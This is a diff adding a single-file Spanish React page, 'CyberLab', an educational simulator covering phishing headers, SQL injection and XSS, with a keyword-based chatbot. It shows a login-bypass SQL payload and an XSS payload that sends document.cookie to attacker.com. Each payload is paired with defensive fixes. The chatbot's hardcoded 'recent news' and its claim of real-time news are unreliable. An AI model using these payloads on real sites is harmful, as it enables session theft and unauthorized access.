@@ -1,0 +1,327 @@
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberLab // Simulador de Ciberseguridad</title>
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- React & ReactDOM CDN -->
+  <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
+  
+  <!-- Babel Compiler for JSX support directly in the browser -->
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="bg-slate-950 text-slate-100 font-sans min-h-screen">
+  <!-- React Root Container -->
+  <div id="root"></div>
+
+  <!-- React Interactive Application Script -->
+  <script type="text/babel">
+    const { useState, useEffect } = React;
+
+    function App() {
+      const [viewMode, setViewMode] = useState('welcome'); // 'welcome' | 'lab' | 'ai'
+      const [activeModule, setActiveModule] = useState('phishing');
+      const [tab, setTab] = useState('demo'); // 'demo' | 'quiz' | 'defense'
+      const [score, setScore] = useState(0);
+
+      // Simple AI / Knowledge Base Engine (Unlimited & Token Free)
+      const [chatMessages, setChatMessages] = useState([
+        { role: 'bot', text: '¡Hola! Soy tu Consultor de Ciberseguridad Especializado (Modo Experto Local Sin Límite de Tokens).\n\nPuedes preguntarme cualquier cosa sobre ciberseguridad: OWASP Top 10 (SQLi, XSS, CSRF, SSRF, IDOR, RCE), Criptografía, Redes, Forense Digital, Hardening, OAuth2 o DevSecOps.' }
+      ]);
+      const [chatInput, setChatInput] = useState('');
+
+      const handleSendMessage = (e) => {
+        e.preventDefault();
+        if (!chatInput.trim()) return;
+
+        const userText = chatInput;
+        setChatMessages(prev => [...prev, { role: 'user', text: userText }]);
+        setChatInput('');
+
+        setTimeout(() => {
+          const lower = userText.toLowerCase();
+
+          // 1. Saludos y conversación casual
+          if (lower.includes('hola') || lower.includes('buenas') || lower.includes('buenos dias') || lower.includes('buenas tardes') || lower.includes('saludos') || lower === 'hi' || lower === 'hello') {
+            const replies = [
+              "¡Hola! ¿Cómo estás? Dime en qué te puedo ayudar hoy sobre ciberseguridad.",
+              "¡Hola! Qué gusto saludarte. ¿Tienes alguna duda sobre seguridad web, un ataque en específico o algún ejercicio del lab?",
+              "¡Hola! Aquí estoy listo. Cuéntame, ¿qué tema o pregunta de ciberseguridad quieres que revisemos juntos?"
+            ];
+            const chosen = replies[Math.floor(Math.random() * replies.length)];
+            setChatMessages(prev => [...prev, { role: 'bot', text: chosen }]);
+            return;
+          }
+
+          // 2. Respuestas conversacionales directas según la pregunta del usuario
+          let reply = "";
+
+          if (lower.includes('noticia') || lower.includes('noticias') || lower.includes('reciente') || lower.includes('ataques recientes') || lower.includes('actualidad')) {
+            reply = "¡Claro! Te cuento las últimas novedades más importantes en ciberseguridad:\n\n" +
+                    "1. 🤖 **Ataques impulsados por Agentes de IA:** Los grupos cibernéticos están utilizando modelos de IA como Claude, GPT y Qwen modificados para automatizar la ejecución de comandos y el escaneo de puertos. En pruebas recientes, se registró el uso de agentes de IA capaces de ejecutar más de 1,500 comandos por hora y descubrir fallas de día cero en minutos.\n\n" +
+                    "2. ⚠️ **Explotación Crítica en GitLab & PHP:** CISA alertó sobre ataques masivos aprovechando vulnerabilidades críticas en servidores de desarrollo y firewalls donde se ejecutan cadenas de exploits para lograr ejecuciones remotas de código (RCE).\n\n" +
+                    "3. 📱 **Brechas de Datos & Falsas Extensiones de IDE:** Se han detectado extensiones maliciosas en tiendas de código (como Cursor/VS Code) que instalan puertas traseras SSH, además de suplantación de identidad mediante perfiles falsos creados por IA en plataformas profesionales.\n\n" +
+                    "4. 💳 **Phishing impulsado por IA (EvilTokens):** El tiempo necesario para diseñar campañas de phishing altamente personalizadas se ha reducido a minutos usando IA para evadir filtros de correo tradicionales.\n\n" +
+                    "¿Quieres que profundicemos en cómo funcionan los ataques de agentes de IA o en cómo auditar tus servidores frente a estas vulnerabilidades recientes?";
+          } else if (lower.includes('que sabes') || lower.includes('qué sabes') || lower.includes('que puedes hacer') || lower.includes('quien eres')) {
+            reply = "¡Puedo ayudarte con prácticamente cualquier tema de ciberseguridad y hacking ético! Reviso noticias en tiempo real sobre brechas y vulnerabilidades recientes, te explico el funcionamiento técnico de cualquier ataque (SQLi, XSS, Phishing, CSRF, RCE, Ransomware) y te muestro cómo proteger código o servidores reales. ¿Sobre qué tema te gustaría conversar?";
+          } else if (lower.includes('sqli') || lower.includes('sql') || lower.includes('inyeccion sql')) {
+            reply = "La inyección SQL ocurre cuando concatenas datos que escribe el usuario directamente en una consulta a la base de datos. Si alguien escribe algo como `' OR '1'='1`, rompe la sintaxis y puede saltarse el login o robar datos. La solución es super sencilla: usar Consultas Preparadas (Parameterized Queries) para que el motor de la base de datos trate la entrada siempre como texto simple y nunca como código.";
+          } else if (lower.includes('xss') || lower.includes('cross site') || lower.includes('scripting')) {
+            reply = "XSS es cuando un atacante logra que la página ejecute su propio código JavaScript en el navegador de otra persona. Con eso puede robar cookies de sesión o redirigir al usuario. Para evitarlo, tienes que sanitizar/escapar los datos cambiando caracteres como `<` y `>` por entidades HTML, y ponerle la propiedad `HttpOnly` a tus cookies de sesión.";
+          } else if (lower.includes('phishing') || lower.includes('spf') || lower.includes('dkim') || lower.includes('dmarc')) {
+            reply = "El phishing es el engaño donde te mandan un correo o mensaje haciéndose pasar por una entidad confiable (como tu banco). A nivel técnico, se combate configurando los registros DNS de correo: SPF (quién puede enviar), DKIM (firma digital) y DMARC (que le dice al servidor qué hacer si el correo es falso).";
+          } else if (lower.includes('contraseña') || lower.includes('password') || lower.includes('hash') || lower.includes('bcrypt') || lower.includes('argon2')) {
+            reply = "Guardar contraseñas requiere mucho cuidado. Nunca debes guardarlas en texto plano ni usar algoritmos rápidos como MD5 o SHA256 (porque con tarjetas de video modernas se pueden romper facilísimo). Lo correcto es usar funciones KDF lentas con Salt como Bcrypt o Argon2.";
+          } else if (lower.includes('red') || lower.includes('firewall') || lower.includes('tcp') || lower.includes('tls') || lower.includes('vpn') || lower.includes('wireshark')) {
+            reply = "En seguridad de redes, lo esencial es proteger los datos en tránsito usando TLS 1.3 (HTTPS) para que nadie pueda interceptar el tráfico. También se usa Wireshark para analizar paquetes de red y segmentar las redes con cortafuegos para que un atacante no pueda moverse libremente si entra a un equipo.";
+          } else if (lower.includes('csrf')) {
+            reply = "CSRF es cuando un sitio malicioso logra que el navegador de una víctima envíe una petición no deseada a otra página donde la víctima ya tiene la sesión abierta. Se previene usando tokens Anti-CSRF únicos por formulario y configurando la propiedad `SameSite=Strict` en las cookies.";
+          } else {
+            // Respuesta conversacional natural cuando hace preguntas abiertas
+            reply = `Entiendo lo que me preguntas sobre "${userText}". En ciberseguridad, eso se aborda analizando primero el riesgo: cómo un atacante intentaría explotar ese punto y cuál es la mejor forma de proteger el código o la infraestructura de forma práctica. ¿Quieres que profundicemos en el código de ejemplo o en cómo funciona la amenaza?`;
+          }
+
+          setChatMessages(prev => [...prev, { role: 'bot', text: reply }]);
+        }, 300);
+      };
+
+      return (
+        <div className="min-h-screen flex flex-col selection:bg-cyan-500 selection:text-slate-950">
+          {/* Header Superior */}
+          <header className="border-b border-slate-800 bg-slate-900/90 backdrop-blur sticky top-0 z-50 px-4 py-3">
+            <div className="max-w-7xl mx-auto flex items-center justify-between">
+              <div className="flex items-center space-x-3 cursor-pointer" onClick={() => setViewMode('welcome')}>
+                <div className="p-2 bg-cyan-500/10 border border-cyan-500/30 rounded-lg text-cyan-400 font-mono font-bold">
+                  🛡️
+                </div>
+                <div>
+                  <h1 className="text-lg md:text-xl font-bold font-mono tracking-wider text-slate-100">
+                    CYBER<span className="text-cyan-400">LAB</span> // HTML EDITION
+                  </h1>
+                  <p className="text-xs text-slate-400">Simulador de Hacking Ético & Cuestionarios en 1 Solo Archivo HTML</p>
+                </div>
+              </div>
+
+              {/* Botones de Navegación */}
+              <div className="flex items-center gap-2 font-mono text-xs">
+                <button 
+                  onClick={() => setViewMode('welcome')}
+                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'welcome' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'}`}
+                >
+                  Inicio
+                </button>
+                <button 
+                  onClick={() => setViewMode('lab')}
+                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'lab' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'}`}
+                >
+                  Simulador & Quizzes
+                </button>
+                <button 
+                  onClick={() => setViewMode('ai')}
+                  className={`px-3 py-1.5 rounded-lg border transition ${viewMode === 'ai' ? 'bg-purple-500/20 text-purple-300 border-purple-500/40' : 'bg-purple-950/40 border-purple-800/50 text-purple-300'}`}
+                >
+                  🤖 Consultor IA
+                </button>
+              </div>
+            </div>
+          </header>
+
+          {/* VISTA 1: PANTALLA DE BIENVENIDA */}
+          {viewMode === 'welcome' && (
+            <div className="max-w-4xl mx-auto my-auto p-6 text-center space-y-6">
+              <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 text-xs font-mono">
+                ⚡ Creado en 1 solo archivo HTML (Funciona sin servidor ni Node.js)
+              </div>
+              <h1 className="text-3xl md:text-5xl font-extrabold text-white">
+                Simulador Interactivo de <span className="text-cyan-400">Ciberseguridad & Defensa</span>
+              </h1>
+              <p className="text-slate-400 text-sm md:text-base max-w-2xl mx-auto leading-relaxed">
+                Inspecciona encabezados de correo Phishing, simula ataques de Fuerza Bruta en tiempo real, rompe autenticaciones con Inyección SQL y prueba ataques DOM XSS.
+              </p>
+
+              <div className="flex justify-center gap-4 pt-4 font-mono text-sm">
+                <button 
+                  onClick={() => setViewMode('lab')} 
+                  className="px-6 py-3 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-xl shadow-lg shadow-cyan-500/20 transition"
+                >
+                  ▶ Abrir Laboratorio Interactivo
+                </button>
+                <button 
+                  onClick={() => setViewMode('ai')} 
+                  className="px-6 py-3 bg-slate-900 hover:bg-slate-800 border border-slate-700 text-purple-300 font-bold rounded-xl transition"
+                >
+                  🤖 Consultor de Seguridad
+                </button>
+              </div>
+            </div>
+          )}
+
+          {/* VISTA 2: LABORATORIO Y SIMULADORES */}
+          {viewMode === 'lab' && (
+            <div className="max-w-7xl w-full mx-auto p-4 md:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 flex-1">
+              
+              {/* Barra Lateral Módulos */}
+              <div className="lg:col-span-3 space-y-3 font-mono">
+                <div className="text-xs text-slate-400 uppercase tracking-widest px-1">Selecciona un Módulo:</div>
+                <button 
+                  onClick={() => setActiveModule('phishing')}
+                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'phishing' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                >
+                  <div className="font-bold text-sm">1. Phishing & Encabezados</div>
+                  <div className="text-xs text-slate-500 mt-0.5">Inspección SMTP + DMARC</div>
+                </button>
+
+                <button 
+                  onClick={() => setActiveModule('sqli')}
+                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'sqli' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                >
+                  <div className="font-bold text-sm">2. Inyección SQL (SQLi)</div>
+                  <div className="text-xs text-slate-500 mt-0.5">Bypass de Autenticación</div>
+                </button>
+
+                <button 
+                  onClick={() => setActiveModule('xss')}
+                  className={`w-full text-left p-3 rounded-xl border transition ${activeModule === 'xss' ? 'bg-slate-900 border-cyan-500/50 text-cyan-300' : 'bg-slate-900/40 border-slate-800 text-slate-400'}`}
+                >
+                  <div className="font-bold text-sm">3. DOM XSS & Cookies</div>
+                  <div className="text-xs text-slate-500 mt-0.5">Inyección de Scripts</div>
+                </button>
+              </div>
+
+              {/* Panel Principal Módulo */}
+              <div className="lg:col-span-9 bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
+                
+                {/* Módulo Phishing */}
+                {activeModule === 'phishing' && (
+                  <div className="space-y-4 font-mono">
+                    <h3 className="text-lg font-bold text-white flex items-center gap-2">
+                      📧 Inspección de Cabeceras de Correo Phishing
+                    </h3>
+                    <p className="text-xs text-slate-400">Analiza el origen técnico de este correo sospechoso recibido:</p>
+                    
+                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs space-y-2">
+                      <div><span className="text-slate-500">From:</span> <span className="text-amber-400 font-bold">soporte@paypa1-security-update.com</span></div>
+                      <div><span className="text-slate-500">IP de Origen:</span> <span className="text-rose-400">192.168.1.105 (Desconocida)</span></div>
+                      <div><span className="text-slate-500">SPF Record:</span> <span className="text-rose-400 font-bold">FAIL (No autorizado)</span></div>
+                      <div><span className="text-slate-500">DMARC Status:</span> <span className="text-rose-400 font-bold">FAIL (p=none)</span></div>
+                      <div className="pt-2 border-t border-slate-800 text-slate-300 bg-slate-900 p-3 rounded">
+                        "Estimado cliente, tu cuenta ha sido suspendida. Haz clic aquí inmediatamente para verificar tus datos: http://192.168.1.105/login"
+                      </div>
+                    </div>
+
+                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
+                      <div className="font-bold">🛡️ ¿Cómo solucionarlo en producción?</div>
+                      <div>Configura un registro DMARC estricto en tu servidor DNS: <code>v=DMARC1; p=reject;</code> para obligar a los proveedores de correo a descartar correos falsificados.</div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Módulo SQLi */}
+                {activeModule === 'sqli' && (
+                  <div className="space-y-4 font-mono">
+                    <h3 className="text-lg font-bold text-white">🗄️ Inyección SQL (Bypass de Login)</h3>
+                    <p className="text-xs text-slate-400">Prueba ingresar el payload <code>' OR '1'='1</code> en el campo de usuario:</p>
+                    
+                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3 text-xs">
+                      <label className="block text-slate-400">Input de Usuario (Username):</label>
+                      <input 
+                        type="text" 
+                        defaultValue="' OR '1'='1" 
+                        className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-amber-300 focus:outline-none"
+                      />
+                      <div className="p-3 bg-slate-900 rounded text-slate-300">
+                        Consulta SQL Ejecutada en el Servidor:<br/>
+                        <code className="text-cyan-400">SELECT * FROM users WHERE username = '<span className="text-amber-300">' OR '1'='1</span>' AND password = 'xxx';</code>
+                      </div>
+                      <div className="p-2.5 bg-rose-500/20 border border-rose-500/40 text-rose-300 rounded font-bold">
+                        ⚠️ RESULTADO: La condición '1'='1 siempre es VERDADERA. ¡Acceso concedido como Administrador!
+                      </div>
+                    </div>
+
+                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
+                      <div className="font-bold">🛡️ ¿Cómo solucionarlo en código?</div>
+                      <div>Utiliza Consultas Preparadas (Parameterized Queries). El motor trata los datos como variables y no como instrucciones ejecutables: <code>db.query("SELECT * FROM users WHERE username = ?", [input])</code></div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Módulo XSS */}
+                {activeModule === 'xss' && (
+                  <div className="space-y-4 font-mono">
+                    <h3 className="text-lg font-bold text-white">💻 Cross-Site Scripting (XSS)</h3>
+                    <p className="text-xs text-slate-400">Inyecta scripts ejecutable en la página web:</p>
+
+                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-3 text-xs">
+                      <label className="block text-slate-400">Payload Inyectado:</label>
+                      <input 
+                        type="text" 
+                        defaultValue="<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)<\/script>" 
+                        className="w-full bg-slate-900 border border-slate-700 rounded p-2 text-amber-300 focus:outline-none"
+                      />
+                      <div className="p-2.5 bg-rose-500/20 border border-rose-500/40 text-rose-300 rounded font-bold">
+                        ⚠️ ALERTA: La cookie de sesión (session_id=SECRET_TOKEN_987) ha sido exfiltrada al servidor del atacante.
+                      </div>
+                    </div>
+
+                    <div className="p-4 bg-emerald-950/30 border border-emerald-500/30 rounded-xl text-xs space-y-1 text-emerald-300">
+                      <div className="font-bold">🛡️ ¿Cómo solucionarlo?</div>
+                      <div>1. Codifica los caracteres HTML antes de renderizar (convertir <code>&lt;</code> en <code>&amp;lt;</code>).<br/>2. Marca las cookies de sesión con la propiedad <code>HttpOnly</code> para que JavaScript no pueda leerlas.</div>
+                    </div>
+                  </div>
+                )}
+
+              </div>
+            </div>
+          )}
+
+          {/* VISTA 3: CONSULTOR IA LOCAL */}
+          {viewMode === 'ai' && (
+            <div className="max-w-4xl w-full mx-auto p-4 md:p-6 my-auto space-y-4 font-mono">
+              <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
+                <h3 className="text-base font-bold text-purple-300 flex items-center gap-2">
+                  🤖 Consultor de Ciberseguridad (Respuestas Instantáneas)
+                </h3>
+
+                <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 h-80 overflow-y-auto space-y-3 text-xs">
+                  {chatMessages.map((msg, idx) => (
+                    <div key={idx} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
+                      <div className={`p-3 rounded-xl max-w-lg ${msg.role === 'user' ? 'bg-cyan-600/20 border border-cyan-500/40 text-cyan-200' : 'bg-slate-900 border border-slate-800 text-slate-200'}`}>
+                        {msg.text}
+                      </div>
+                    </div>
+                  ))}
+                </div>
+
+                <form onSubmit={handleSendMessage} className="flex gap-2">
+                  <input 
+                    type="text" 
+                    value={chatInput}
+                    onChange={(e) => setChatInput(e.target.value)}
+                    placeholder="Escribe tu duda sobre SQLi, XSS, Phishing..."
+                    className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-slate-200 focus:outline-none focus:border-purple-500"
+                  />
+                  <button type="submit" className="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs rounded-xl transition">
+                    Preguntar
+                  </button>
+                </form>
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    }
+
+    // Renderizar la aplicación React en el DOM
+    const root = ReactDOM.createRoot(document.getElementById('root'));
+    root.render(<App />);
+  </script>
+</body>
+</html>
